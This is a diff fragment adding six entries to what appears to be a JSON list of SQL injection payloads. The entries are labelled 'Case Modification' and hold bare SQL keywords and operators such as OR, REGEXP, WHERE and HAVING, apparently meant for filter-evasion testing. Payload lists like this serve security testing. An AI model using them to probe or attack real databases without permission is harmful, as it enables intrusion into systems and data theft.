+  {
+    "id": "sqli-140",
+    "title": "Case Modification",
+    "payload": "&&",
+    "context": "Case Modification",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-141",
+    "title": "Case Modification",
+    "payload": "OR",
+    "context": "Case Modification",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-142",
+    "title": "Case Modification",
+    "payload": "REGEXP",
+    "context": "Case Modification",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-143",
+    "title": "Case Modification",
+    "payload": "NOT BETWEEN 0 AND X",
+    "context": "Case Modification",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-144",
+    "title": "Case Modification",
+    "payload": "WHERE",
+    "context": "Case Modification",
+    "tags": [
+      "sqli"
+    ]
+  },
+  {
+    "id": "sqli-145",
+    "title": "Case Modification",
+    "payload": "HAVING",
+    "context": "Case Modification",
+    "tags": [
+      "sqli"
+    ]
+  }
+]
